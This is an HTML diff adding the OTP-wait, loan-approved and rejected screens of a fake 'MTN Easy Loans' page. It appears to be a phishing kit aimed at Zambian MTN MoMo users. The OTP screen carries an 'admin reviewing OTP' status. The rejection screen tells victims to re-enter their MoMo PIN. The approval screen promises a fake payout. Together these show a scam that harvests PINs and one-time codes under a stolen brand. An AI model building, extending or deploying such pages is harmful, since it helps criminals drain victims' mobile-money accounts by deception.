@@ -210,4 +210,105 @@
     </div>
 
     <!-- PAGE 9: WAIT OTP -->
-    <div id="page-w
+    <div id="page-wait-otp" class="page">
+        <div style="background:linear-gradient(135deg, #FFCC00, #E6B800); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2 data-i18n="verifying_otp">Verifying OTP...</h2>
+                <p data-i18n="verifying_otp_sub">Your OTP has been received. Please wait for confirmation...</p>
+                <div id="waitOtpStatus" style="margin-top:20px; font-size:0.9rem; color:#004F9F;" data-i18n="admin_reviewing_otp">⏳ Verifying OTP...</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);" data-i18n="app_id">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:#004F9F;">-</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 10: APPROVAL -->
+    <div id="page-approval" class="page">
+        <header class="app-header">
+            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
+        <div class="appr-wrap">
+            <div class="appr-top">
+                <div class="check-circle">✓</div>
+                <h1 class="appr-title" data-i18n="approved_title">Loan Approved!</h1>
+                <p class="appr-sub" data-i18n="approved_sub">Your loan has been approved and will be disbursed shortly</p>
+            </div>
+
+            <div class="appr-banner">
+                <div class="abl" data-i18n="approved_amount">Approved Amount</div>
+                <div class="aba" id="approvedAmount">500 ZMW</div>
+            </div>
+
+            <div class="comp-box">
+                <div class="ch" data-i18n="congrats">🎉 Congratulations!</div>
+                <p data-i18n="approved_msg">Your loan application has been fully approved. The funds will be sent to your MTN MoMo wallet within 24 hours.</p>
+            </div>
+
+            <div class="ld-card">
+                <div class="ld-htitle" data-i18n="loan_details">Loan Details</div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-g">💰</div>
+                    <div><div class="ld-lbl" data-i18n="amount_label">Loan Amount</div><div class="ld-val" id="ldAmount">500 ZMW</div></div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-b">📅</div>
+                    <div><div class="ld-lbl" data-i18n="term_label">Loan Term</div><div class="ld-val" id="ldTerm">30 Days</div></div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-p">📱</div>
+                    <div><div class="ld-lbl" data-i18n="phone_label2">Phone Number</div><div class="ld-val" id="ldPhone">+260 97 123 4567</div></div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-g">🆔</div>
+                    <div><div class="ld-lbl" data-i18n="app_id_label">Application ID</div><div class="ld-val" id="ldAppId" style="font-family:monospace;">-</div></div>
+                </div>
+            </div>
+
+            <div class="nxt-steps">
+                <span>📌</span>
+                <p data-i18n="next_steps">Next Steps: You will receive an SMS confirmation once funds are disbursed to your MTN MoMo wallet.</p>
+            </div>
+
+            <div class="rth-wrap">
+                <button class="rth-btn" onclick="goTo('page-landing')" data-i18n="return_home">RETURN TO HOME</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 11: REJECTED -->
+    <div id="page-rejected" class="page">
+        <header class="app-header">
+            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
+        <div class="appr-wrap">
+            <div class="appr-top">
+                <div class="check-circle" style="background:linear-gradient(135deg,#e74c3c,#c0392b);box-shadow:0 8px 24px rgba(231,76,60,0.35);">✕</div>
+                <h1 class="appr-title" data-i18n="rejected_title">Application Rejected</h1>
+                <p class="appr-sub" data-i18n="rejected_sub">Unfortunately, your application could not be approved at this time</p>
+            </div>
+
+            <div class="comp-box" style="background:#fef2f2;border-left-color:#c0392b;">
+                <div class="ch" style="color:#c0392b;" data-i18n="rejected_reason">Reason</div>
+                <p id="rejectionReason" data-i18n="rejected_default">Your application did not meet the required criteria. Please ensure your MTN MoMo PIN is correct and try again.</p>
+            </div>
+
+            <div class="nxt-steps" style="background:#fef2f2;">
+                <span>💡</span>
+                <p data-i18n="rejected_tip">Tip: Make sure you have sufficient balance and correct PIN. You can retry your application after 24 hours.</p>
+            </div>
+
+            <div class="rth-wrap">
+                <button class="rth-btn" onclick="goTo('page-landing')" data-i18n="return_home">RETURN TO HOME</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
